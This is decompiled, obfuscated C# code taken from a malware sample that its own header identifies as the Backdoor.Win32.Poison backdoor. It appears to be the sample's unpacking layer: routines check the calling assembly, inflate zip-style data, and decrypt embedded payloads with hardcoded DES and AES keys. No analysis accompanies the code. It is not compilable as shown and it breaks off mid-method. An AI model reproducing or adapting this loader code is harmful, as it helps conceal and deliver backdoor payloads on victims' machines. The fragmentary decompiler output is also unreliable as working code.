// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c1ca78561cb11ead
// MVID: 2D47F565-522D-4F7E-99C5-0FAB4FA0B168
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Poison.eqbg-1d1c34c3e9b902e7445301b77a51949865f13999db65bb166e4f7800abbf116b.exe

using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.IsolatedStorage;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;

namespace \u0007
{
  internal sealed class \u0004
  {
    [NonSerialized]
    internal static \u000F.\u0002 \u0093;

    static void \u0001([In] bool obj0, [In] int obj1, [In] \u0008.\u0002.\u0007 obj2, [In] byte[] obj3, [In] int obj4)
    {
      try
      {
        if (true)
          \u0007.\u0004.\u0001(obj2.\u0001, obj0 ? 1 : 0, 3);
        \u0007.\u0004.\u0001(obj2.\u0001);
        if (true)
          goto label_5;
label_1:
        if (true)
        {
          \u0007.\u0004.\u0001(obj2);
          return;
        }
        goto label_6;
label_5:
        \u0007.\u0004.\u0001(obj2.\u0001, obj4);
label_6:
        \u0007.\u0004.\u0001(obj2.\u0001, ~obj4);
        \u0007.\u0004.\u0001(obj3, obj1, obj4, obj2.\u0001);
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0007 obj = obj2;
        byte[] numArray = obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj4;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    static Dictionary<string, ulong> \u0001([In] \u0003.\u0007 obj0)
    {
      Dictionary<string, ulong> dictionary;
      try
      {
        dictionary = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return dictionary;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetSystemInfo")]
    static extern void \u0001([In] ref \u0002.\u0005.\u0002 obj0);

    static unsafe int \u0001([In] int obj0, [In] \u0008.\u0002.\u0001 obj1, [In] int obj2, [In] byte[] obj3)
    {
      void* voidPtr;
      do
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(12);
        try
        {
          *(int*) voidPtr = 0;
label_11:
          do
          {
            if (obj1.\u0001 != 11)
              goto label_12;
label_6:
            do
            {
              if (!\u0007.\u0004.\u0001(obj1))
              {
                if (\u0007.\u0004.\u0001(obj1.\u0001) <= 0)
                  goto label_10;
              }
              else
                goto label_11;
            }
            while (false);
            continue;
label_12:
            *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj0, obj2, obj1.\u0001, obj3);
            do
            {
              obj2 += *(int*) ((IntPtr) voidPtr + 4);
              if (false)
                goto label_11;
            }
            while (false);
            *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
            obj0 -= *(int*) ((IntPtr) voidPtr + 4);
            if (obj0 != 0)
              goto label_6;
            else
              goto label_5;
          }
          while (obj1.\u0001 != 11);
          goto label_10;
label_5:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
          if (true)
            goto label_14;
label_10:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
          \u0008.\u0002.\u0001 obj = obj1;
          byte[] numArray = obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj0;
          \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) numArray, (object) local3, (object) local4);
          throw;
        }
label_14:;
      }
      while (false);
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static void \u0001([In] \u0003.\u0005 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u0003.\u0005 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static unsafe bool \u0001()
    {
      void* voidPtr;
      if (true)
      {
        int num = 2;
        if (num == 0)
          return num != 0;
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num);
        try
        {
          if (\u001C\u0002.\u0087\u0003() != 8)
          {
            if (\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2217), \u0007.\u0004.\u0093(2234)) && \u0007.\u0004.\u0001(\u0007.\u0004.\u0001(), out *(bool*) voidPtr))
              *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
            else
              *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 0;
          }
          else
            *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) 1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> local = (ValueType) (bool) *(sbyte*) voidPtr;
          \u0007.\u0004.\u0001(ex, (object) local);
          throw;
        }
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static void \u0001([In] \u0008.\u0007 obj0, [In] uint obj1)
    {
      object obj2;
      try
      {
        try
        {
          \u001D\u0002.\u0089\u0003(obj2 = \u0008.\u0007.\u0001);
          try
          {
            \u0007.\u0004.\u0001(obj0);
            \u0007.\u0004.\u0001(obj1);
          }
          finally
          {
            \u001D\u0002.\u008A\u0003(obj2);
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object obj3 = obj2;
        \u0008.\u0007 obj4 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, obj3, (object) obj4, (object) local);
        throw;
      }
    }

    static int \u0001([In] \u0008.\u0002.\u0002 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0002 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static bool \u0001([In] \u0008.\u0002.\u0006 obj0)
    {
      bool flag;
      try
      {
        flag = \u0007.\u0004.\u0001(obj0.\u0001);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0006 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static int \u0001([In] \u0008.\u0002.\u0002 obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0002 - obj0.\u0001;
        do
        {
          if (true)
            goto label_7;
label_6:
          continue;
label_7:
          int num3 = obj0.\u0003;
          do
          {
            if (true)
              num3 >>= 3;
          }
          while (false);
          num2 += num3;
          goto label_6;
        }
        while (false);
        num1 = num2;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0002 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001([In] \u0008.\u0002.\u0008 obj0)
    {
      int length;
      try
      {
        int num1 = obj0.\u0005;
        int num2 = 65274;
        if (num2 != 0)
        {
          if (num1 >= num2)
          {
            \u0007.\u0004.\u0001(obj0);
            if (false)
              return;
            goto label_7;
          }
          else
            goto label_7;
        }
label_5:
        length = num1 - num2;
label_6:
        Array.Copy((Array) obj0.\u0002, obj0.\u0008, (Array) obj0.\u0001, obj0.\u0005 + obj0.\u0006, length);
        obj0.\u0008 += length;
        obj0.\u0007 += length;
        obj0.\u0006 += length;
label_7:
        while (obj0.\u0006 >= 262 || obj0.\u0008 >= obj0.\u000E)
        {
          if (true)
          {
            if (obj0.\u0006 < 3)
              return;
            \u0007.\u0004.\u0001(obj0);
            return;
          }
        }
        length = 65536 - obj0.\u0006 - obj0.\u0005;
        if (length > obj0.\u000E - obj0.\u0008)
        {
          int num3 = obj0.\u000E;
          num2 = obj0.\u0008;
          num1 = num3;
          goto label_5;
        }
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) length;
        \u0008.\u0002.\u0008 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0004.\u0002.\u0002 obj0, [In] string obj1)
    {
      if (\u0016.\u007E\u0002\u0002((object) obj1, \u0007.\u0004.\u0093(2255)))
      {
        \u0007.\u0004.\u0001(obj0.\u0001, \u000F.\u0006.\u0003, obj1);
        obj0.\u0001 = false;
      }
      else
      {
        \u0007.\u0004.\u0001(obj0.\u0001, \u000F.\u0006.\u0004, string.Empty, obj1);
        obj0.\u0001 = true;
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_1:
      try
      {
        try
        {
          if (\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2260)))
          {
            \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2265));
            goto label_13;
          }
          else if (!\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2306)))
          {
            if (\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2356)))
            {
              if (true)
              {
                \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2365));
                goto label_13;
              }
              else
                goto label_26;
            }
            else
              goto label_8;
          }
label_4:
          \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2315));
          goto label_13;
label_8:
          if (true)
          {
            if (\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2406)))
              \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2423));
            else if (\u0007.\u0004.\u0001(\u0007.\u0004.\u0093(2464)))
              \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2477));
          }
          else
            goto label_1;
label_13:
          if (true)
          {
            *(int*) voidPtr = \u0083.\u007E\u0088\u0002((object) \u0097.\u007E\u009E\u0002((object) \u0096.\u009D\u0002()));
            switch (*(int*) voidPtr)
            {
              case 5:
                break;
              case 6:
                *(int*) ((IntPtr) voidPtr + 8) = \u0083.\u007E\u0089\u0002((object) \u0097.\u007E\u009E\u0002((object) \u0096.\u009D\u0002()));
                switch (*(int*) ((IntPtr) voidPtr + 8))
                {
                  case 0:
                    goto label_22;
                  case 1:
                    \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2654));
                    goto label_26;
                  case 2:
                    \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2691));
                    goto label_26;
                  default:
                    goto label_26;
                }
              default:
                goto label_26;
            }
          }
          *(int*) ((IntPtr) voidPtr + 4) = \u0083.\u007E\u0089\u0002((object) \u0097.\u007E\u009E\u0002((object) \u0096.\u009D\u0002()));
          if (true)
          {
            switch (*(int*) ((IntPtr) voidPtr + 4))
            {
              case 0:
                \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2518));
                goto label_26;
              case 1:
                \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2551));
                if (true)
                {
                  if (false)
                    break;
                  goto label_26;
                }
                else
                  goto label_4;
              case 2:
                \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2580));
                goto label_26;
              default:
                goto label_26;
            }
          }
          else
            goto label_26;
label_22:
          if (true)
            \u0001.\u0007.\u0001(\u0007.\u0004.\u0093(2613));
          else
            goto label_8;
label_26:
          \u0007.\u0004.\u0001();
          \u0007.\u0004.\u0001();
          \u0007.\u0004.\u0001();
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      \u0008.\u0002.\u000F obj1;
      byte[] numArray1;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u0008.\u0002.\u0001 obj2;
      byte[] buffer4;
      \u0008.\u0002.\u0001 obj3;
      byte[] numArray2;
      byte[] numArray3;
      \u0008.\u0001 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      \u0003.\u0005 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] numArray7;
      Assembly callingAssembly;
      Assembly executingAssembly;
      try
      {
        callingAssembly = Assembly.GetCallingAssembly();
        executingAssembly = Assembly.GetExecutingAssembly();
        if ((object) callingAssembly != (object) executingAssembly && !\u0007.\u0004.\u0001(callingAssembly, executingAssembly))
          return (byte[]) null;
        obj1 = new \u0008.\u0002.\u000F(obj0);
        numArray1 = new byte[0];
        *(int*) voidPtr = \u0007.\u0004.\u0001(obj1);
        if (*(int*) voidPtr == 67324752)
        {
          *(short*) ((IntPtr) voidPtr + 44) = (short) \u0007.\u0004.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0004.\u0001(obj1);
          if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
            throw new FormatException("Wrong Header Signature");
          \u0007.\u0004.\u0001(obj1);
          \u0007.\u0004.\u0001(obj1);
          \u0007.\u0004.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0004.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 16) = \u0007.\u0004.\u0001(obj1);
          *(int*) ((IntPtr) voidPtr + 20) = \u0007.\u0004.\u0001(obj1);
          if (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            buffer1 = new byte[*(int*) ((IntPtr) voidPtr + 16)];
            obj1.Read(buffer1, 0, *(int*) ((IntPtr) voidPtr + 16));
          }
          if (*(int*) ((IntPtr) voidPtr + 20) > 0)
          {
            buffer2 = new byte[*(int*) ((IntPtr) voidPtr + 20)];
            obj1.Read(buffer2, 0, *(int*) ((IntPtr) voidPtr + 20));
          }
          buffer3 = new byte[obj1.Length - obj1.Position];
          obj1.Read(buffer3, 0, buffer3.Length);
          obj2 = new \u0008.\u0002.\u0001(buffer3);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
          \u0007.\u0004.\u0001(numArray1.Length, obj2, 0, numArray1);
          buffer3 = (byte[]) null;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
          *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
          if (*(int*) voidPtr != 8223355)
            throw new FormatException("Unknown Header");
          if (*(int*) ((IntPtr) voidPtr + 24) == 1)
          {
            *(int*) ((IntPtr) voidPtr + 28) = \u0007.\u0004.\u0001(obj1);
            numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
            *(int*) ((IntPtr) voidPtr + 32) = 0;
            while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
            {
              *(int*) ((IntPtr) voidPtr + 36) = \u0007.\u0004.\u0001(obj1);
              *(int*) ((IntPtr) voidPtr + 40) = \u0007.\u0004.\u0001(obj1);
              buffer4 = new byte[*(int*) ((IntPtr) voidPtr + 36)];
              obj1.Read(buffer4, 0, buffer4.Length);
              obj3 = new \u0008.\u0002.\u0001(buffer4);
              \u0007.\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 40), obj3, *(int*) ((IntPtr) voidPtr + 32), numArray1);
              *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 2)
          {
            numArray2 = new byte[8]
            {
              (byte) 103,
              (byte) 202,
              (byte) 246,
              (byte) 178,
              (byte) 155,
              (byte) 32,
              (byte) 83,
              (byte) 125
            };
            numArray3 = new byte[8]
            {
              (byte) 223,
              (byte) 118,
              (byte) 21,
              (byte) 56,
              (byte) 146,
              (byte) 136,
              (byte) 29,
              (byte) 66
            };
            obj4 = new \u0008.\u0001();
            try
            {
              cryptoTransform1 = \u0007.\u0004.\u0001(numArray3, obj4, numArray2, true);
              try
              {
                numArray4 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0007.\u0004.\u0001(numArray4);
              }
              finally
              {
                cryptoTransform1?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj4)?.Dispose();
            }
          }
          if (*(int*) ((IntPtr) voidPtr + 24) == 3)
          {
            numArray5 = new byte[16]
            {
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1,
              (byte) 1
            };
            numArray6 = new byte[16]
            {
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2,
              (byte) 2
            };
            obj5 = new \u0003.\u0005();
            try
            {
              cryptoTransform2 = \u0007.\u0004.\u0001(true, numArray6, obj5, numArray5);
              try
              {
                numArray7 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray1 = \u0007.\u0004.\u0001(numArray7);
              }
              finally
              {
                cryptoTransform2?.Dispose();
              }
            }
            finally
            {
              ((IDisposable) obj5)?.Dispose();
            }
          }
        }
        obj1.Close();
        return numArray1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[33]
        {
          (object) callingAssembly,
          (object) executingAssembly,
          (object) obj1,
          (object) numArray1,
          (object) *(int*) voidPtr,
          (object) *(short*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) buffer1,
          (object) buffer2,
          (object) buffer3,
          (object) obj2,
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) obj3,
          (object) buffer4,
          (object) numArray2,
          (object) numArray3,
          (object) obj4,
          (object) cryptoTransform1,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) obj5,
          (object) cryptoTransform2,
          (object) numArray7,
          (object) obj0
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001([In] \u0001.\u0005 obj0, [In] string obj1, [In] \u0008.\u0005 obj2)
    {
      try
      {
        \u0008.\u0005 obj = obj2;
        int num = (int) obj0;
        string str = obj1;
        string empty = string.Empty;
        if (false)
          return;
        \u0007.\u0004.\u0001(obj, (\u0001.\u0005) num, str, empty);
      }
      catch (Exception ex)
      {
        \u0008.\u0005 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<\u0001.\u0005> local = (System.Enum) obj0;
        string str = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local, (object) str);
        throw;
      }
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0007.\u0004.\u0001(obj0, new object[3]
        {
          obj1,
          obj2,
          obj3
        });
        goto label_2;
      }
      while (false);
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0007 obj0, [In] int obj1)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(8);
        try
        {
          do
          {
            int num1 = obj1;
            int num2 = (int) byte.MaxValue;
            if (num2 != 0)
            {
              if (num1 == num2)
              {
                *(int*) ((IntPtr) voidPtr + 4) = 285;
                continue;
              }
              goto label_7;
            }
            else
              goto label_5;
label_4:
            if (true)
            {
              int num3 = obj1;
              num2 = 8;
              num1 = num3;
            }
            else
              goto label_7;
label_5:
            if (num1 >= num2)
            {
              do
              {
                *(int*) voidPtr = *(int*) voidPtr + 4;
              }
              while (false);
              obj1 >>= 1;
              goto label_4;
            }
            else
              goto label_11;
label_7:
            *(int*) voidPtr = 257;
            goto label_4;
          }
          while (false);
          goto label_13;
label_11:
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          \u0008.\u0002.\u0007 obj = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
          throw;
        }
      }
label_13:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] short[] obj0, [In] \u0008.\u0002.\u0007.\u0001 obj1, [In] byte[] obj2)
    {
label_0:
      try
      {
        if (false)
          goto label_2;
        else
          goto label_4;
label_1:
        if (true)
          obj1.\u0001 = obj2;
        else
          goto label_0;
label_2:
        if (true)
          return;
        goto label_1;
label_4:
        obj1.\u0002 = obj0;
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0007.\u0001 obj = obj1;
        short[] numArray1 = obj0;
        byte[] numArray2 = obj2;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) numArray1, (object) numArray2);
        throw;
      }
    }

    static bool \u0001()
    {
      bool flag;
      try
      {
        do
        {
          if (true)
          {
            int num1 = \u0007.\u0004.\u0001(89);
            int num2 = 0;
            if (num2 == 0)
            {
              int num3 = num1 == num2 ? 1 : 0;
              num2 = 0;
              num1 = num3;
            }
            flag = num1 == num2;
          }
        }
        while (false);
      }
      catch
      {
        if (true)
          flag = false;
      }
      return flag;
    }

    static void \u0001([In] \u0008.\u0005.\u0002 obj0, [In] string obj1)
    {
      try
      {
        if (\u0016.\u007E\u0002\u0002((object) obj1, \u0007.\u0004.\u0093(2255)))
        {
          \u0007.\u0004.\u0001(\u0001.\u0005.\u0003, obj1, obj0.\u0001);
          obj0.\u0001 = false;
        }
        else
        {
          \u0007.\u0004.\u0001(obj0.\u0001, \u0001.\u0005.\u0004, string.Empty, obj1);
          obj0.\u0001 = true;
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0005.\u0002 obj = obj0;
        string str = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) str);
        throw;
      }
    }

    static string \u0001([In] \u0004.\u0002.\u0003 obj0) => obj0.\u0002;

    static unsafe int \u0001([In] \u0008.\u0002.\u0007 obj0, [In] int obj1)
    {
      void* voidPtr;
      int num1;
      do
      {
        num1 = 8;
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num1);
          try
          {
            do
            {
              *(int*) voidPtr = 0;
            }
            while (false);
            int num2;
            for (; obj1 >= 4; obj1 = num2)
            {
              if (true)
                *(int*) voidPtr = *(int*) voidPtr + 2;
              int num3 = obj1;
              while (true)
              {
                num2 = num3 >> 1;
                if (false)
                  num3 = num2;
                else
                  break;
              }
            }
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
            \u0008.\u0002.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj1;
            \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
            throw;
          }
        }
        else
          goto label_6;
      }
      while (false);
      goto label_14;
label_6:
      return num1;
label_14:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static IDisposable \u0001()
    {
      IDisposable disposable;
      try
      {
        disposable = (IDisposable) new \u0005.\u0006.\u0001(\u0005.\u0006.\u0004);
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
      return disposable;
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0004 obj0, [In] \u0008.\u0002.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      int index;
      try
      {
        if ((index = \u0007.\u0004.\u0001(obj1, 9)) < 0)
        {
          *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0004.\u0001(obj1);
          index = \u0007.\u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
          num = (int) obj0.\u0001[index];
          if (num >= 0 && (num & 15) <= *(int*) ((IntPtr) voidPtr + 12))
          {
            \u0007.\u0004.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
            *(int*) ((IntPtr) voidPtr + 16) = -1;
        }
        else if ((num = (int) obj0.\u0001[index]) < 0)
        {
          *(int*) voidPtr = -(num >> 4);
          *(int*) ((IntPtr) voidPtr + 4) = num & 15;
          if ((index = \u0007.\u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
          {
            num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
            \u0007.\u0004.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0004.\u0001(obj1);
            do
            {
              index = \u0007.\u0004.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
              num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
              if ((num & 15) <= *(int*) ((IntPtr) voidPtr + 8))
                \u0007.\u0004.\u0001(obj1, num & 15);
              else
                goto label_8;
            }
            while (false);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
            if (true)
              goto label_15;
label_8:
            *(int*) ((IntPtr) voidPtr + 16) = -1;
          }
        }
        else
        {
          \u0007.\u0004.\u0001(obj1, num & 15);
          *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u0008.\u0002.\u0004 obj2 = obj0;
        \u0008.\u0002.\u0002 obj3 = obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 16);
    }

    static void \u0001([In] \u0008.\u0002.\u0006 obj0)
    {
      try
      {
        if (false)
          return;
        obj0.\u0001 |= 12;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0006 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static void \u0001()
    {
      try
      {
        try
        {
          \u0005.\u0001.\u0001();
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] \u0008.\u0002.\u000E obj3)
    {
      try
      {
        byte[] sourceArray = obj0;
        int sourceIndex = obj1;
        byte[] destinationArray = obj3.\u0001;
        int destinationIndex = obj3.\u0002;
        int length = obj2;
        if (true)
          goto label_2;
label_1:
        obj3.\u0002 += obj2;
        return;
label_2:
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000E obj = obj3;
        byte[] numArray = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj2;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2);
        throw;
      }
    }

    static Type \u0001([In] \u000F.\u0005 obj0) => obj0.\u0001;

    static unsafe bool \u0001([In] int obj0, [In] \u0008.\u0002.\u0007 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      short[] numArray1;
